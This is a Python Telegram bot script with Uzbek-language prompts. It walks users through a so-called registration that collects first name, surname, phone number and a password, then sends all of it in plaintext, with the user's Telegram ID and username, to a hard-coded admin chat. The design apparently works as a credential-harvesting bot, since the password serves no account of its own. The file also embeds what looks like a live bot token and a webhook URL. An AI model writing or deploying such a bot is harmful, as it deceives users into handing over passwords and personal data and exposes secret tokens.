import os
import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

TOKEN = os.getenv("BOT_TOKEN", "8884076033:AAETr0Myy44CaxIN8EKqZct9xMbcpTnRhrU")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5940981967"))

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

NAME, SURNAME, PHONE, PASSWORD = range(4)

phone_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("📱 Share Contact", request_contact=True)]],
    one_time_keyboard=True,
    resize_keyboard=True,
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "Assalomu alaykum! 👋\n\n"
        "Ro'yxatdan o'tish uchun quyidagi ma'lumotlarni kiriting.\n\n"
        "📝 Ismingizni kiriting:"
    )
    return NAME


async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["name"] = update.message.text.strip()
    await update.message.reply_text("👨‍👩‍👦 Familiyangizni kiriting:")
    return SURNAME


async def get_surname(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["surname"] = update.message.text.strip()
    await update.message.reply_text(
        "📱 Telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard,
    )
    return PHONE


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message.contact:
        phone = update.message.contact.phone_number
    else:
        phone = update.message.text.strip()
    context.user_data["phone"] = phone
    await update.message.reply_text(
        "🔑 Parolni kiriting:",
        reply_markup=None,
    )
    return PASSWORD


async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text.strip()
    context.user_data["password"] = password

    data = context.user_data
    username = update.message.from_user.username
    username_text = f"@{username}" if username else "yoq"

    msg = (
        "🆕 **Yangi foydalanuvchi ro'yxatdan o'tdi!**\n\n"
        f"👤 Ism: {data['name']}\n"
        f"👨‍👩‍👦 Familiya: {data['surname']}\n"
        f"📱 Telefon: {data['phone']}\n"
        f"🔑 Parol: {data['password']}\n\n"
        f"🆔 User ID: {update.message.from_user.id}\n"
        f"📧 Username: {username_text}"
    )

    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=msg,
            parse_mode="Markdown",
        )
    except Exception as e:
        logger.error(f"Failed to send to admin: {e}")

    await update.message.reply_text(
        "✅ Ro'yxatdan o'tish muvaffaqiyatli yakunlandi!\n\n"
        "Ma'lumotlaringiz admin yuborildi. Tez orada siz bilan bog'lanamiz."
    )

    context.user_data.clear()
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    await update.message.reply_text("❌ Ro'yxatdan o'tish bekor qilindi.")
    return ConversationHandler.END


def main():
    app = Application.builder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
            SURNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_surname)],
            PHONE: [
                MessageHandler(filters.CONTACT, get_phone),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
            ],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)

    port = int(os.getenv("PORT", 10000))
    webhook_base = os.getenv("WEBHOOK_URL", "https://tgbot-7rkf.onrender.com")

    if webhook_base:
        webhook_url = f"{webhook_base.rstrip('/')}/{TOKEN}"
        app.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path=TOKEN,
            webhook_url=webhook_url,
        )
    else:
        app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
